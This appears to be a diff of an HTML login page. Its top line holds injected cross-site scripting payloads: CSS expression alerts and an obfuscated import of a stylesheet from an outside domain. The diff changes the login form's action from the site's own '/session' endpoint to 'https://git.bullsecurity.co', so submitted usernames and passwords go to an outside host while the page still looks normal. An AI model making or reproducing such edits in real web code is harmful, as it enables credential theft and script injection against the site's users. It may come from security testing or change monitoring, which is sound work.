@@ -1,5 +1,5 @@
 
-<div style="width: expression(alert('XSS'));"><style>@im\port'https://\git\.bullsecurity\.co\/test.css';</style><img style="xss:expr/*XSS*/ession(alert('XSS'))"><img src="x"><style><img src="</style><img src="">
+<div style="width: expression(alert('XSS'));"><style>@im\port'https://\git\.bullsecurity\.co\/test.css';</style><img style="xss:expr/*XSS*/ession(alert('XSS'))"><img src=""><style><img src="</style><img src="">
   
     <div class="columns is-centered is-vcentered">
   <div class="column is-full-mobile is-fixed-medium">
@@ -18,7 +18,7 @@
 
 
           <div>
-            <form class="new_user" id="new_user" action="/session" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="oLvVZxkRIXC35v/4Gf8JHKWAx/oLcmuU4hEHwjGPajF1nj7MemTDt8FreDjKFtFyQNFIbvy3GLyVuphhWISZgA==">
+            <form class="new_user" id="new_user" action="https://git.bullsecurity.co" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="oLvVZxkRIXC35v/4Gf8JHKWAx/oLcmuU4hEHwjGPajF1nj7MemTDt8FreDjKFtFyQNFIbvy3GLyVuphhWISZgA==">
 
   <div class="field">
     <label class="label" for="user_login">Username or email</label>
